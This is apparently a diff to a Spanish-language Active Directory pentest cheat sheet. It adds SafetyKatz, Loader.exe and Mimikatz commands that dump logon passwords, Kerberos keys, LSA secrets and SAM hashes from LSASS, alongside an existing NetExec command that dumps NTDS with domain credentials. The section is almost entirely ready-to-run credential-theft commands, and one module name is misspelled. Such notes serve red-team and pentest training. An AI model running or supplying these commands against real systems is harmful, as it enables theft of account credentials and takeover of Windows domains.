@@ -61,3 +61,29 @@ TIP:  <-IMPORTANTE
 # NTDS - Requiere usuario del dominio y pertenecer al grupo Administrators en DC
 ❯ nxc smb <IP> -u 'user1' -p 'Password1!' --ntds 
 ```
+
+## Safetykatz - Mimikatz  
+```powershell 
+! Usuario local con permisos de Administrador 
+
+# Ejecutar una versión modificada de Mimikatz (SafetyKatz) para extraer desde LSASS las claves Kerberos (AES, RC4, etc.) de los usuarios en memoria 
+❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-keys" exit      
+❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-logonPasswords" exit
+
+❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-logonpasswords" "exit" 
+❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-keys" "exit" 
+
+
+
+# Extraer desde LSASS las claves de cifrado Kerberos (AES, RC4, etc.) de las sesiones de usuarios en el sistema.
+❯ .\mimikatz.exe -Command "privilege::debug"  
+
+	sekurlsa::logonpasswords
+	skurlsa::logonpasswords /full
+	sekurlsa::ekeys
+	lsadump::lsa /patch
+	lsadump::secrets
+	lsadump::sam 
+	token::elevate
+	exit
+```
